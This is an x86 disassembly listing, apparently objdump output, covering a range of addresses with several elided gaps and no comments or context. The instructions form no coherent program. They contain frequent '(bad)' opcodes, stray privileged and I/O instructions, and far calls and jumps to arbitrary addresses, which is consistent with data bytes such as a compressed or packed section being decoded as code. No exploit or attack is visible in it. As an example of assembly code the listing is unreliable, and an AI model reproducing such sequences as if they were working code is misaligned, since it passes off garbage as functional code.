  4257b3:	add    BYTE PTR [edx],ah
  4257b5:	pop    eax
  4257b6:	test   bh,ch
  4257b8:	(bad)  
  4257b9:	jmp    FWORD PTR [ebx-0x23]
  4257bc:	jp     0x425751
  4257be:	cmp    edx,esp
  4257c0:	loop   0x4257e5
  4257c2:	stc    
  4257c3:	sub    esi,ecx
  4257c5:	mov    es,WORD PTR [ecx]
  4257c7:	add    ch,dh
  4257c9:	add    BYTE PTR [eax],al
  4257cb:	add    BYTE PTR [edi+0x48],bl
  4257ce:	xchg   ebx,eax
  4257cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257d0:	inc    eax
  4257d1:	rcr    BYTE PTR [ebx-0x1d19e3d2],cl
  4257d7:	js     0x42580e
  4257d9:	inc    ecx
  4257da:	retf   0xe4d9
  4257dd:	or     BYTE PTR [eax+0x7a33fce],0x67
  4257e4:	ds call 0x29d0:0xa5ceee3a
  4257ec:	or     DWORD PTR [eax-0x343f332b],esp
  4257f2:	repz mov eax,0x73304c26
  4257f8:	and    DWORD PTR [edi-0x6e52d68d],0x7fdbd3d4
  425802:	(bad)  
  425803:	cwde   
  425804:	pop    eax
  425805:	jno    0x42582e
  425807:	ins    DWORD PTR es:[edi],dx
  425808:	out    dx,eax
  425809:	xchg   esi,eax
  42580a:	pop    edx
  42580b:	aas    
  42580c:	data16 xor al,0x4f
  42580f:	mov    al,ds:0xe9ca417b
  425814:	mov    eax,ds:0x85acabf9
  425819:	into   
  42581a:	leave  
  42581b:	cld    
  42581c:	pop    esp
  42581d:	les    ecx,FWORD PTR [esi]
  42581f:	xor    eax,0xab68fb5
  425824:	pop    edi
  425825:	jbe    0x4257a7
  425827:	mov    ebx,0xcc469816
  42582c:	leave  
  42582d:	inc    eax
  42582e:	nop
  42582f:	adc    eax,0x79569d43
  425834:	mov    eax,0x7bba8871
  425839:	mov    esi,0x2ee9a815
  42583e:	push   ebp
  42583f:	ja     0x425813
  425841:	pusha  
  425842:	bound  esi,QWORD PTR [edi+0x675d8d9]
  425848:	cmp    eax,0xad690f12
  42584d:	jo     0x4257da
  42584f:	call   0x980d89ee
  425854:	xor    ebx,DWORD PTR [esp+esi*2-0x7e]
  425858:	inc    ebx
  425859:	dec    esp
  42585a:	pop    esp
  42585b:	push   ebp
  42585c:	mov    ds:0x4fbda8ba,eax
  425861:	xor    BYTE PTR [ebx],dl
  425863:	cmp    BYTE PTR [esp+eiz*4-0x66],ah
  425867:	dec    edx
  425868:	and    eax,0xa3e05350
  42586d:	sbb    DWORD PTR [edi],0x3b
  425870:	push   0x7913e375
  425875:	icebp  
  425876:	inc    esi
  425877:	pop    ebp
  425878:	ret    0x98a0
  42587b:	mov    WORD PTR [ebx+0x774377ff],gs
  425881:	bound  edx,QWORD PTR [ebx]
  425883:	fisub  WORD PTR [esi]
  425885:	lods   eax,DWORD PTR ds:[esi]
  425886:	and    ch,BYTE PTR [ebx+ebx*1]
  425889:	cdq    
  42588a:	add    eax,0x16104f9e
  42588f:	fs pop es
  425891:	jmp    0x45344772
  425896:	gs in  al,dx
  425898:	add    ebp,ecx
  42589a:	pop    es
  42589b:	jb     0x42586f
  42589d:	out    dx,al
  42589e:	xchg   ecx,eax
  42589f:	repz jns 0x42584f
  4258a2:	ret    0x28d1
  4258a5:	xor    BYTE PTR [edx-0x4983773e],bh
  4258ab:	ins    BYTE PTR es:[edi],dx
  4258ac:	jl     0x425878
  4258ae:	cld    
  4258af:	bndldx (bad),[edx-0x5d22a3fb]
  4258b6:	xlat   BYTE PTR ds:[ebx]
  4258b7:	mov    al,BYTE PTR [ecx+0x7a2a9a75]
  4258bd:	xchg   esi,eax
  4258be:	adc    eax,0x840c
	...
  425933:	add    BYTE PTR [ebx+0x18],ch
  425936:	arpl   WORD PTR [edx+0x73],bp
  425939:	jnp    0x4259a6
  42593b:	sbb    esp,esp
  42593d:	xchg   edi,eax
  42593e:	sub    DWORD PTR [ecx],edi
  425940:	outs   dx,DWORD PTR ds:[esi]
  425941:	dec    eax
  425942:	ss and dh,0x8f
  425946:	add    DWORD PTR [eax],eax
  425948:	cmc    
  425949:	add    BYTE PTR [eax],al
  42594b:	add    BYTE PTR [esi-0x2a3dcd7a],dh
  425951:	and    bl,BYTE PTR [edx+0x51]
  425954:	sahf   
  425955:	pop    bp
  425957:	dec    ebx
  425958:	ror    BYTE PTR [esi-0x64],1
  42595b:	push   ebp
  42595c:	xor    edx,DWORD PTR [eax+0x64]
  42595f:	and    BYTE PTR [ecx+ebp*2+0x65b3999d],0x30
  425967:	inc    ebx
  425968:	fwait
  425969:	push   edx
  42596a:	push   0xffffffd5
  42596c:	fwait
  42596d:	mov    ah,0xbf
  42596f:	loop   0x4259ea
  425971:	fimul  WORD PTR [esi-0x55a46948]
  425977:	mov    al,BYTE PTR [ecx+0x7df3f413]
  42597d:	repnz lahf 
  42597f:	fs popa 
  425981:	bound  ecx,QWORD PTR [ebx+ebx*4-0x66307bba]
  425988:	not    DWORD PTR [edx+0x1f]
  42598b:	cwde   
  42598c:	xor    al,0x46
  42598e:	push   ecx
  42598f:	aas    
  425990:	cdq    
  425991:	icebp  
  425992:	daa    
  425993:	jle    0x425947
  425995:	ss xchg edx,eax
  425997:	mov    edi,0x17f1233d
  42599c:	shl    DWORD PTR [ebx],1
  42599e:	dec    edx
  42599f:	mov    ch,0xe6
  4259a1:	dec    edi
  4259a2:	jg     0x4259a4
  4259a4:	mov    dl,0x1b
  4259a6:	sub    BYTE PTR [edx],ah
  4259a8:	stos   BYTE PTR es:[edi],al
  4259a9:	ds add edi,edx
  4259ac:	sub    bh,BYTE PTR [edx+0x5d]
  4259af:	pop    ebp
  4259b0:	xchg   ebx,eax
  4259b1:	mov    edi,0xf5c8d6c3
  4259b6:	adc    ch,BYTE PTR [ecx+0x2d5f0bb2]
  4259bc:	mov    esi,DWORD PTR [esp+ecx*8+0x76]
  4259c0:	xor    esi,DWORD PTR [ebp*8+0x4379e88c]
  4259c7:	bound  edi,QWORD PTR [ebx]
  4259c9:	xor    ebp,DWORD PTR [edi-0x4d9c5a61]
  4259cf:	inc    ecx
  4259d0:	popa   
  4259d1:	xor    esp,esp
  4259d3:	pushf  
  4259d4:	xor    eax,0x8127eabc
  4259d9:	fst    DWORD PTR [ebx+0x1355d2a5]
  4259df:	mov    edi,esp
  4259e1:	push   ebx
  4259e2:	and    dh,BYTE PTR ds:0xabc452f3
  4259e8:	inc    esp
  4259e9:	inc    ebx
  4259ea:	jle    0x4259de
  4259ec:	sti    
  4259ed:	in     eax,0x69
  4259ef:	(bad)  
  4259f0:	and    al,0x33
  4259f2:	in     al,0xeb
  4259f4:	jecxz  0x4259ee
  4259f6:	pop    edx
  4259f7:	and    eax,0x6c7de7b6
  4259fc:	and    al,0x7f
  4259fe:	(bad)  
  4259ff:	jno    0x4259a1
  425a01:	adc    al,0x86
  425a03:	sub    BYTE PTR [esi+ebp*8+0x73],0x8e
  425a08:	vmwrite ebp,DWORD PTR [eax-0x5c]
  425a0c:	call   0x559e:0x9136f16d
  425a13:	gs cli 
  425a15:	scas   eax,DWORD PTR es:[edi]
  425a16:	(bad)  
  425a17:	xchg   esp,eax
  425a18:	dec    ebp
  425a19:	jl     0x425a76
  425a1b:	pop    esi
  425a1c:	inc    edx
  425a1d:	cmp    BYTE PTR [ebp+0x2a981d82],0x51
  425a24:	std    
  425a25:	(bad)  
  425a27:	xor    dh,BYTE PTR [edx-0x5b]
  425a2a:	shl    edi,0xf1
  425a2d:	popa   
  425a2e:	cld    
  425a2f:	stos   DWORD PTR es:[edi],eax
  425a30:	sub    edi,DWORD PTR [edx]
  425a32:	push   ebp
  425a33:	addr16 iret 
  425a35:	ja     0x425a2c
  425a37:	sub    cl,BYTE PTR [edi+0x37996ee]
  425a3d:	push   esp
  425a3e:	cmp    BYTE PTR [esi],al
  425a40:	inc    edi
	...
  425ab1:	add    BYTE PTR [eax],al
  425ab3:	add    BYTE PTR [esi],al
  425ab5:	aas    
  425ab6:	or     eax,0xb6bb3db9
  425abb:	mov    edi,0xa9fcb6ec
  425ac0:	mov    ?,ecx
  425ac2:	cmc    
  425ac3:	push   edi
  425ac4:	fist   DWORD PTR [eax+0xf50001]
  425aca:	add    BYTE PTR [eax],al
  425acc:	adc    bl,BYTE PTR [ecx-0x11696005]
  425ad2:	xchg   BYTE PTR [edi+edx*2-0x2d],cl
  425ad6:	xor    ch,BYTE PTR [ecx-0x25f98a0a]
  425adc:	push   0x27
  425ade:	pusha  
  425adf:	and    al,0x8
  425ae1:	add    ecx,DWORD PTR [ebx-0x80]
  425ae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ae5:	mov    esi,DWORD PTR [esi-0x5d]
  425ae8:	(bad)  
  425aea:	fs popf 
  425aec:	scas   al,BYTE PTR es:[edi]
  425aed:	ret    
  425aee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425aef:	xor    cl,BYTE PTR [ebx-0x11]
  425af2:	pusha  
  425af3:	mov    dh,0x70
  425af5:	ins    DWORD PTR es:[edi],dx
  425af6:	xchg   ecx,eax
  425af7:	inc    ebx
  425af8:	out    dx,eax
  425af9:	leave  
  425afa:	adc    al,0xc0
  425afc:	xchg   ebp,eax
  425afd:	stos   DWORD PTR es:[edi],eax
  425afe:	test   esi,0xd033a149
  425b04:	outs   dx,BYTE PTR ds:[esi]
  425b05:	push   esi
  425b06:	jae    0x425b2f
  425b08:	out    0xd9,al
  425b0a:	out    0x5c,al
  425b0c:	push   ss
  425b0d:	add    ah,BYTE PTR [ecx+0x31]
  425b10:	xor    cl,bh
  425b12:	mov    esp,0x5f882008
  425b17:	and    DWORD PTR [esi+ebp*2-0xab6ec4b],ebp
  425b1e:	add    al,0x4
  425b20:	leave  
  425b21:	call   0x75a:0x830ff734
  425b28:	sbb    ebp,DWORD PTR [ebx]
  425b2a:	jecxz  0x425b2a
  425b2c:	mov    dl,0xf2
  425b2e:	out    dx,al
  425b2f:	jnp    0x425adb
  425b31:	inc    edi
  425b32:	mov    ch,0xd8
  425b34:	or     BYTE PTR [edi+0x46cc88d0],ch
  425b3a:	(bad)  
  425b3b:	mov    esi,0xd1554ffb
  425b40:	sbb    cl,BYTE PTR [edi+0x63]
  425b43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b44:	dec    esp
  425b45:	xchg   edi,eax
  425b46:	test   ebx,0x98fdcea3
  425b4c:	xchg   esp,eax
  425b4d:	inc    esi
  425b4e:	retf   0x1914
  425b51:	loopne 0x425b58
  425b53:	cmp    eax,0xb968de13
  425b58:	inc    ebp
  425b59:	aad    0xb1
  425b5b:	iret   
  425b5c:	push   esi
  425b5d:	call   0xa201:0x4aef8d5d
  425b64:	stos   DWORD PTR es:[edi],eax
  425b65:	gs ds pusha 
  425b68:	jo     0x425b21
  425b6a:	stos   BYTE PTR es:[edi],al
  425b6b:	push   0x2422cd4d
  425b70:	(bad)  
  425b71:	std    
  425b72:	outs   dx,BYTE PTR ds:[esi]
  425b73:	addr16 (bad) 
  425b75:	dec    edi
  425b76:	rcr    DWORD PTR [esi-0x62],cl
  425b79:	mov    ch,0xf
  425b7b:	adc    ecx,ebx
  425b7d:	daa    
  425b7e:	dec    ebx
  425b7f:	mov    BYTE PTR [edi],0x4c
  425b82:	out    0xaf,al
  425b84:	into   
  425b85:	mov    WORD PTR [esi+0x20],gs
  425b88:	add    dh,ch
  425b8a:	dec    ebx
  425b8b:	fcom   QWORD PTR [ecx+ecx*1]
  425b8e:	out    0x49,al
  425b90:	ret    0xe0b0
  425b93:	add    BYTE PTR [ecx+0x30],dl
  425b96:	dec    ebp
  425b97:	mov    esi,0xfda75aba
  425b9c:	ja     0x425bb0
  425b9e:	mov    dh,0x21
  425ba0:	cmp    eax,0x7de9c6ea
  425ba5:	jae    0x425bcc
  425ba7:	jns    0x425c05
  425ba9:	pusha  
  425baa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425bab:	xchg   ecx,eax
  425bac:	or     ebp,DWORD PTR [eax+0x715dc452]
  425bb2:	add    BYTE PTR [edi],dl
  425bb4:	jle    0x425b91
  425bb6:	push   0xb9dfc096
  425bbb:	das    
  425bbc:	xor    dh,BYTE PTR [edi-0x28]
  425bbf:	mov    ds:0xfa,eax
	...
  425c34:	ins    BYTE PTR es:[edi],dx
  425c35:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  425c3c:	cli    
  425c3d:	sub    ch,cl
  425c3f:	call   0x91d0:0xc655040b
  425c46:	add    DWORD PTR [eax],eax
  425c48:	cmc    
  425c49:	add    BYTE PTR [eax],al
  425c4b:	add    bl,ah
  425c4d:	std    
  425c4e:	cmp    al,0x23
  425c50:	out    dx,al
  425c51:	fild   WORD PTR [eax+0x25]
  425c54:	gs repz ja 0x425c4f
  425c58:	aad    0x9f
  425c5a:	mov    bl,0x76
  425c5c:	dec    bl
  425c5e:	push   ecx
  425c5f:	ror    bh,0x8
  425c62:	push   ds
  425c63:	sbb    al,0x45
  425c65:	mov    eax,ss:0x786654e3
  425c6b:	push   es
  425c6c:	mov    dh,0xae
  425c6e:	sub    al,0x46
  425c70:	pop    ebx
  425c71:	arpl   WORD PTR [eax-0x22],di
  425c74:	mov    edx,0x1b2974c6
  425c79:	repnz push ss
  425c7b:	push   edx
  425c7c:	sub    DWORD PTR [esp+ebp*4+0x302966b2],ecx
  425c83:	cmp    eax,0xda123498
  425c88:	call   0x5fd4:0x82823bf6
  425c8f:	xchg   ebx,eax
  425c90:	pop    ebp
  425c91:	out    dx,al
  425c92:	fucomip st,st(0)
  425c94:	xor    DWORD PTR [eax-0x6],0xcdd5c4a3
  425c9b:	cmp    DWORD PTR [eax-0x310eb043],esp
  425ca1:	rol    edx,0xde
  425ca4:	inc    edi
  425ca5:	enter  0x6bad,0xf3
  425ca9:	and    cl,bl
  425cab:	retf   
  425cac:	outs   dx,DWORD PTR ds:[esi]
  425cad:	adc    cl,0x5d
  425cb0:	outs   dx,DWORD PTR ds:[esi]
  425cb1:	(bad)  
  425cb2:	std    
  425cb3:	arpl   sp,si
  425cb5:	pusha  
  425cb6:	jecxz  0x425c8e
  425cb8:	xor    DWORD PTR [edi],esp
  425cba:	in     eax,0x6f
  425cbc:	loope  0x425cce
  425cbe:	push   edi
  425cbf:	mov    ebp,0x138c2921
  425cc4:	aaa    
  425cc5:	adc    al,0x85
  425cc7:	test   eax,0x99ebc01b
  425ccc:	outs   dx,BYTE PTR ds:[esi]
  425ccd:	xchg   BYTE PTR [esi],ch
  425ccf:	aad    0x78
  425cd1:	xor    DWORD PTR [eax-0x68],0xfe3b0df2
  425cd8:	mov    al,0xf1
  425cda:	jno    0x425c91
  425cdc:	mov    BYTE PTR [ebp+0x18],cl
  425cdf:	fs push ecx
  425ce1:	pusha  
  425ce2:	inc    ebx
  425ce3:	ror    cl,1
  425ce5:	ret    0xbe70
  425ce8:	or     eax,0xf6d5ad14
  425ced:	jo     0x425cad
  425cef:	ret    0x7176
  425cf2:	loop   0x425c82
  425cf4:	xlat   BYTE PTR ds:[ebx]
  425cf5:	imul   edx,esi,0x3f196c37
  425cfb:	std    
  425cfc:	ins    BYTE PTR es:[edi],dx
  425cfd:	xchg   ch,dl
  425cff:	mov    dh,0xd3
  425d01:	iret   
  425d02:	ror    BYTE PTR [esi],0xf8
  425d05:	loope  0x425d50
  425d07:	out    dx,al
  425d08:	stos   BYTE PTR es:[edi],al
  425d09:	fldcw  WORD PTR [ecx-0x75102733]
  425d0f:	mov    ah,0x50
  425d11:	jae    0x425cb9
  425d13:	retf   0xd4ed
  425d16:	mov    dl,0xc
  425d18:	cld    
  425d19:	ret    0xede9
  425d1c:	fcmove st,st(1)
  425d1e:	je     0x425cbe
  425d20:	add    al,0x1f
  425d22:	das    
  425d23:	jmp    0x425d5e
  425d25:	push   esp
  425d26:	adc    DWORD PTR [eax+0x693a2ae],esi
  425d2c:	sbb    eax,DWORD PTR [edi-0x70]
  425d2f:	ss js  0x425d74
  425d32:	sub    bl,ah
  425d34:	push   edi
  425d35:	xchg   edi,eax
  425d36:	mov    edx,0x60f2e74e
  425d3b:	lods   al,BYTE PTR ds:[esi]
  425d3c:	pop    edi
  425d3d:	cmp    DWORD PTR [eax+0xc7ab],ebx
	...
  425db3:	add    BYTE PTR ds:0xf361d20c,bh
  425db9:	(bad)  
  425dba:	mov    edi,0xa480315c
  425dbf:	in     al,dx
  425dc0:	cmc    
  425dc1:	pop    ds
  425dc2:	aad    0xee
  425dc4:	lds    edx,FWORD PTR [edx+0xf50001]
  425dca:	add    BYTE PTR [eax],al
  425dcc:	mov    al,0x82
  425dce:	mov    dl,0x7d
  425dd0:	mov    esp,0x796bd01b
  425dd5:	and    ch,0xc2
  425dd8:	or     al,BYTE PTR [ebx-0x5ec581cd]
  425dde:	add    ecx,0x5b2274aa
  425de4:	mov    ebp,DWORD PTR [ebx-0x25e8ef66]
  425dea:	or     cl,BYTE PTR [edx]
  425dec:	(bad)  
  425ded:	shl    bl,cl
  425def:	jle    0x425e0c
  425df1:	(bad)  
  425df2:	mov    esi,0x243795d8
  425df7:	pop    ebx
  425df8:	out    0xd2,eax
  425dfa:	inc    eax
  425dfb:	repnz pushf 
  425dfd:	jae    0x425dbc
  425dff:	fs inc edi
  425e01:	pop    eax
  425e02:	sahf   
  425e03:	int3   
  425e04:	jle    0x425e50
  425e06:	repnz add DWORD PTR [ebx+0x46],esp
  425e0a:	and    DWORD PTR [edi-0x5a],edi
  425e0d:	lds    eax,FWORD PTR ds:[eax+0x31]
  425e11:	jl     0x425e57
  425e13:	aam    0x66
  425e15:	(bad)  
  425e16:	xchg   esp,eax
  425e17:	push   ebp
  425e18:	cmp    dh,BYTE PTR [eax]
  425e1a:	mov    esp,0x9c183801
  425e1f:	in     al,0xb7
  425e21:	sti    
  425e22:	push   edi
  425e23:	ja     0x425dba
  425e25:	lock adc edx,DWORD PTR [bp+di]
  425e29:	fld    QWORD PTR [edi-0x3e1a27d8]
  425e2f:	xor    al,0x19
  425e31:	sahf   
  425e32:	mov    bh,0x4
  425e34:	push   esi
  425e35:	cdq    
  425e36:	or     DWORD PTR [eax],ecx
  425e38:	popf   
  425e39:	loope  0x425e22
  425e3b:	jno    0x425e21
  425e3d:	mov    ebp,0x10500ea6
  425e42:	mov    al,0x62
  425e44:	pop    ds
  425e45:	(bad)  
  425e46:	push   edx
  425e47:	pop    edi
  425e48:	scas   al,BYTE PTR es:[edi]
  425e49:	ror    DWORD PTR [edx*4-0x5f76861],cl
  425e50:	and    BYTE PTR ds:0xff7d3bb3,cl
  425e56:	lahf   
  425e57:	sub    eax,0x5c4c29d3
  425e5c:	jge    0x425df2
  425e5e:	push   ebp
  425e5f:	cwde   
  425e60:	push   esi
  425e61:	adc    esp,DWORD PTR [ebp-0x1c67eb1b]
  425e67:	arpl   sp,sp
  425e69:	mov    dl,BYTE PTR [edx-0x50]
  425e6c:	or     BYTE PTR [edx+edx*4+0x798582d1],bh
  425e73:	je     0x425e9d
  425e75:	jp     0x425e47
  425e77:	aas    
  425e78:	rcl    DWORD PTR fs:[eax],0xa9
  425e7c:	out    0x3,al
  425e7e:	add    BYTE PTR [ecx+0x33f011e6],dh
  425e84:	repnz aad 0x27
  425e87:	sti    
  425e88:	sbb    al,BYTE PTR ds:0x99270adb
  425e8e:	inc    esp
  425e8f:	sub    ecx,DWORD PTR ds:0x2bd5be13
  425e95:	xchg   ebp,eax
  425e96:	es sbb eax,0x3d13a7f2
  425e9c:	(bad)  
  425e9d:	repz dec edx
  425e9f:	pop    ss
  425ea0:	jo     0x425eaa
  425ea2:	pavgw  mm0,QWORD PTR [edi-0x21]
  425ea6:	jle    0x425e6e
  425ea8:	vorps  xmm5,xmm2,XMMWORD PTR [eax+0x59]
  425ead:	adc    BYTE PTR [ebp+0x21db827],bh
  425eb3:	inc    edx
  425eb4:	cli    
  425eb5:	jnp    0x425e60
  425eb7:	or     DWORD PTR [ecx],0xffffff8f
  425eba:	mov    al,ds:0x6b9628f0
  425ebf:	imul   esi,DWORD PTR [ebp+0x0],0x0
	...
  425f32:	add    BYTE PTR [eax],al
  425f34:	dec    ebx
  425f35:	push   ss
  425f36:	int    0x41
  425f38:	fstp   st(3)
  425f3a:	iret   
  425f3b:	push   ds
  425f3c:	lock leave 
  425f3e:	jmp    DWORD PTR [ecx+0x7d]
  425f41:	or     DWORD PTR [edx+0x193ba94],ecx
  425f47:	add    ch,dh
  425f49:	add    BYTE PTR [eax],al
  425f4b:	add    al,cl
  425f4d:	cld    
  425f4e:	mov    ebx,ebx
  425f50:	mov    esp,0xce445029
  425f55:	fwait
  425f56:	popa   
  425f57:	add    eax,0xd3dd18c5
  425f5c:	and    eax,0xd5775e46
  425f61:	jmp    0x70a7c11e
  425f66:	rcl    BYTE PTR [edx-0x28ef1445],1
  425f6c:	mov    dl,0xe
  425f6e:	enter  0x5cdd,0x3f
  425f72:	jl     0x425f6b
  425f74:	mov    eax,0x44d2d362
  425f79:	popf   
  425f7a:	push   eax
  425f7b:	lods   al,BYTE PTR ds:[esi]
  425f7c:	out    0x5,eax
  425f7e:	ficomp WORD PTR [ebp+0x61]
  425f81:	stos   BYTE PTR es:[edi],al
  425f82:	xchg   ebp,eax
  425f83:	addr16 aaa 
  425f85:	(bad)  
  425f87:	in     al,dx
  425f88:	out    0xa2,eax
  425f8a:	call   0x5dc8:0xace9d6fb
  425f91:	push   edx
  425f92:	mov    ecx,0x33caae95
  425f97:	fstp   QWORD PTR ds:0xa6d24c9d
  425f9d:	push   0x24
  425f9f:	and    al,0x56
  425fa1:	adc    dl,BYTE PTR [esi-0x583cf170]
  425fa7:	cs hlt 
  425fa9:	inc    esi
  425faa:	cmp    eax,0xccdf997f
  425faf:	cs pop edx
  425fb1:	mov    al,0x45
  425fb3:	mov    ebx,0x4baa070d
  425fb8:	sub    edx,DWORD PTR [ebp-0x13]
  425fbb:	test   BYTE PTR [ecx],bh
  425fbd:	fldenv [esi+esi*4+0x7fa4f1f9]
  425fc4:	stos   DWORD PTR es:[edi],eax
  425fc5:	pop    ebp
  425fc6:	pop    edx
  425fc7:	pop    ebx
  425fc8:	(bad)  
  425fc9:	jnp    0x425f7b
  425fcb:	ins    BYTE PTR es:[edi],dx
  425fcc:	mov    dh,0x49
  425fce:	repnz mov ds:0xf83aa822,eax
  425fd4:	mov    ecx,DWORD PTR [ecx]
  425fd6:	jl     0x426028
  425fd8:	dec    eax
  425fd9:	add    DWORD PTR ds:0x955879a5,edi
  425fdf:	sub    eax,0xc24abc89
  425fe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fe5:	test   DWORD PTR [eax+0x5],ecx
  425fe8:	jmp    0x6451e385
  425fed:	dec    eax
  425fee:	ins    DWORD PTR es:[edi],dx
  425fef:	push   0x27353dc8
  425ff4:	arpl   WORD PTR [ecx],si
  425ff6:	adc    bh,cl
  425ff8:	or     al,0x4f
  425ffa:	dec    esp
  425ffb:	push   ebp
  425ffc:	mov    esi,0xabe61a89
  426001:	pop    edx
  426002:	stos   BYTE PTR es:[edi],al
  426003:	jae    0x426024
  426005:	mov    bh,0x6b
  426007:	std    
  426008:	int    0xb7
  42600a:	or     DWORD PTR [esi],esi
  42600c:	bound  ebx,QWORD PTR [ebx]
  42600e:	je     0x426009
  426010:	xor    BYTE PTR ds:0x4fd99c75,ch
  426016:	mov    esp,0x65a5ef7
  42601b:	lahf   
  42601c:	pop    ebx
  42601d:	xchg   ebx,eax
  42601e:	test   BYTE PTR [ebp+0x25],bh
  426021:	ret    
  426022:	popf   
  426023:	stos   BYTE PTR es:[edi],al
  426024:	mov    ebp,esi
  426026:	test   al,0xb4
  426028:	icebp  
  426029:	stos   DWORD PTR es:[edi],eax
  42602a:	sti    
  42602b:	xchg   DWORD PTR [edi-0x5d5fa28c],ebp
  426031:	sbb    BYTE PTR [edx-0x43],ah
  426034:	xchg   edx,eax
  426035:	std    
  426036:	ss daa 
  426038:	out    dx,eax
  426039:	cdq    
  42603a:	not    cl
  42603c:	xor    ebx,DWORD PTR [ebx-0x1f]
  42603f:	ins    DWORD PTR es:[edi],dx
  426040:	add    BYTE PTR fs:[eax],al
	...
  4260b3:	add    dh,bl
  4260b5:	adc    DWORD PTR [edi-0x15020dd],ebx
  4260bb:	std    
  4260bc:	sub    al,0x28
  4260be:	pop    ds
  4260bf:	mov    eax,ds:0x5c236f38
  4260c4:	scas   eax,DWORD PTR es:[edi]
  4260c5:	xchg   esp,eax
  4260c6:	add    DWORD PTR [eax],eax
  4260c8:	cmc    
  4260c9:	add    BYTE PTR [eax],al
  4260cb:	add    BYTE PTR [ebx-0x6c],bh
  4260ce:	mov    ds:0xb442eb5a,al
  4260d3:	xchg   edx,eax
  4260d4:	mov    edx,0x1d27cfe0
  4260d9:	and    BYTE PTR [ecx],ah
  4260db:	mov    al,ds:0xa8561259
  4260e0:	jnp    0x426098
  4260e2:	test   DWORD PTR [ebp+ecx*1+0x6a],edi
  4260e6:	push   esp
  4260e7:	cli    
  4260e8:	push   ds
  4260e9:	cmc    
  4260ea:	dec    ebp
  4260eb:	sub    ebx,DWORD PTR [ebp+0x9aefc3b]
  4260f1:	push   eax
  4260f2:	out    0xa5,al
  4260f4:	hlt    
  4260f5:	aam    0x15
  4260f7:	jns    0x4260ef
  4260f9:	push   0xffffffb3
  4260fb:	sbb    al,0xb5
  4260fd:	pop    ds
  4260fe:	add    DWORD PTR [edi],esi
  426100:	outs   dx,BYTE PTR ds:[esi]
  426101:	das    
  426102:	jmp    0x7c97c424
  426107:	lock jae 0x4260fe
  42610a:	stc    
  42610b:	into   
  42610c:	sub    ebx,edi
  42610e:	adc    ebp,DWORD PTR [edx+0x9]
  426111:	sub    al,0x6e
  426113:	mov    al,0x56
  426115:	test   ah,0x41
  426118:	pop    edx
  426119:	sub    al,0xee
  42611b:	in     al,dx
  42611c:	jmp    0xd989:0x16b4
  426122:	mov    dl,0x58
  426124:	cmp    bl,dh
  426126:	pop    esi
  426127:	mov    al,ds:0xf02ebc68
  42612c:	jb     0x42610d
  42612e:	popa   
  42612f:	mov    al,ds:0x69da2c6d
  426134:	fsub   st(3),st
  426136:	jbe    0x426111
  426138:	in     eax,0x48
  42613a:	sub    edx,DWORD PTR [ecx]
  42613c:	int    0x8d
  42613e:	sbb    BYTE PTR [edi+eiz*2],al
  426141:	out    dx,eax
  426142:	jmp    0xb5a6:0x789ab0ec
  426149:	stos   BYTE PTR es:[edi],al
  42614a:	jle    0x4260e2
  42614c:	jns    0x4261b9
  42614e:	pop    esi
  42614f:	mov    bh,0x22
  426151:	ins    DWORD PTR es:[edi],dx
  426152:	hlt    
  426153:	dec    ecx
  426154:	fucomi st,st(3)
  426156:	outs   dx,BYTE PTR ds:[esi]
  426157:	mov    ch,0x80
  426159:	inc    eax
  42615a:	xor    ebx,DWORD PTR [ecx+0x2f]
  42615d:	bound  edx,QWORD PTR [ebx-0x76cd8413]
  426163:	shl    DWORD PTR [ecx+0x44],0xfd
  426167:	in     eax,dx
  426168:	jnp    0x426141
  42616a:	jp     0x4260fb
  42616c:	push   edi
  42616d:	adc    bh,BYTE PTR [ebx-0x26]
  426170:	sbb    dh,0xac
  426173:	xor    al,0x4d
  426175:	out    0xc6,al
  426177:	mov    dl,0xc9
  426179:	mov    al,ds:0x5cf46830
  42617e:	shl    esi,cl
  426180:	inc    DWORD PTR [edi]
  426182:	mov    al,0x37
  426184:	sbb    BYTE PTR ds:0x9431ba12,dl
  42618a:	enter  0xa7cc,0x6b
  42618e:	dec    eax
  42618f:	fstp   TBYTE PTR [ebx]
  426191:	out    0xc2,eax
  426193:	pop    ebp
  426194:	adc    ch,BYTE PTR [ebx+0x34ba73dc]
  42619a:	xor    BYTE PTR [edx-0x892df37],0xa3
  4261a1:	mov    ebp,0xbd7a2b50
  4261a6:	lods   eax,DWORD PTR ds:[esi]
  4261a7:	fisubr DWORD PTR [ebx-0x62495874]
  4261ad:	daa    
  4261ae:	dec    esi
  4261af:	leave  
  4261b0:	gs (bad) 
  4261b2:	fsub   DWORD PTR [edi]
  4261b4:	stos   BYTE PTR es:[edi],al
  4261b5:	in     al,dx
  4261b6:	cld    
  4261b7:	adc    al,0xfd
  4261b9:	fs inc ecx
  4261bb:	mov    BYTE PTR [edi+0x4c],dh
  4261be:	mov    dh,0x9e
  4261c0:	cwde   
	...
  426231:	add    BYTE PTR [eax],al
  426233:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42623a:	mov    ebp,0xdfb43ee6
  42623f:	push   0x4b
  426241:	inc    ebp
  426242:	cmp    edx,ecx
  426244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426245:	xchg   ebp,eax
  426246:	add    DWORD PTR [eax],eax
  426248:	cmc    
  426249:	add    BYTE PTR [eax],al
  42624b:	add    BYTE PTR [esi+0x6e],dl
  42624e:	dec    ebx
  42624f:	xchg   esi,eax
  426250:	jmp    0x42628e
  426252:	sbb    al,0x25
  426254:	out    0xe8,al
  426256:	or     DWORD PTR fs:[edi+0x75],esi
  42625a:	pop    ss
  42625b:	stos   DWORD PTR es:[edi],eax
  42625c:	rcl    BYTE PTR [edx*1+0x3dc009b2],0xc2
  426264:	jae    0x426291
  426266:	aaa    
  426267:	xchg   esp,eax
  426268:	imul   ebp,esi,0x911904e5
  42626e:	or     BYTE PTR [ecx-0x61],al
  426271:	adc    eax,0xf21b46ba
  426276:	fcmovbe st,st(3)
  426278:	jo     0x42623e
  42627a:	xor    dl,BYTE PTR [ecx]
  42627c:	jno    0x42621b
  42627e:	in     al,0x6d
  426280:	arpl   WORD PTR [ebx+0x2d],di
  426283:	pushf  
  426284:	loopne 0x4262e8
